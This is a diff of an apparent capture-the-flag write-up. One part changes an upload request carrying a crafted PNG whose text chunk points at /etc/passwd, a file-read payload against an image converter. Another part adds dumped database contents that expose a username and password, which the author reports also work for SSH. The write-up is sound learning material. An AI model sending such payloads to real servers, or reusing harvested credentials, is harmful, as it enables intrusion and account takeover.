@@ -173,10 +173,9 @@ Content-Disposition: form-data; name="toConvert"; filename="enc.png"
 Content-Type: image/png
 
 PNG
-
-   
-IHDR       ¿6Ì   tEXtprofile /etc/passwdF[×X   IDATxìýi$irß	þô¹ÌÌ="²xì|ÿ³#²²#³r  Ù@UînfÏ¹/TÍ"³+²+2äÝA£®Èws³GUÿÊcl?¯1'Þ¹d¶²³LÎ9î£Ã àãÌç_W¾¾m,üá÷¯<+ËrÅùHHË5à\¤U!oV+o¿~áþö%%ZmÐaÃÓÅ³ï%EÖÇ+¯¿þõþÆûíûýýåÚ÷ÇdðþþNkçÞ;Û¶1P[cAgPk%¦ÐGc cj) 61ÑÑZ¥J­
-#Aë=g¼ÔZpâHBô1¦#Á{âó<á½'ÆÈõ2B`.8' µÆãñ`è½s¦BLà!ZkÔZ­ã½×ïÛ3µUÞßß¸?îýþ ÷NïR
+
+
+IHDR¿6ÌtEXtprofile/etc/passwdF×XIDATxìýi$irß	þô¹ÌÌ="²UînfÏ¹/TÍ"³+²+2äÝA£®Èws³GUÿÊcl?¯1'Þ¹d¶²³LÎ9î£Ã àãÌç_W¾¾m,üá÷¯<+ËrÅùHHË5à\¤U!oV+o¿~áþö%%ZÞ;Û¶1PÑÑZ¥J­ã½×ïÛ3µUÞßß¸?îýþ ÷NïR
 
 ```
 
@@ -286,7 +285,11 @@ function fetchImages() {
 Well that seems as good a target.
 Although my script doesn't handle this file as well as i'd like, the hex returned was entered into cyberchef, i knew this was the sql file as the header is in the format i expect.
 
-
+```
+ HSQLite format 
+...
+StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1images+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL)ndexsqlite_autoindex_users_1users-emilyabigchonkyboi123
+```
 I've stripped a lot out here, but the main thing is that within this file exists a username and password it seems. `emily : abigchonkyboi123` (and yes these work in SSH), time for a quick review before moving on.
 
 
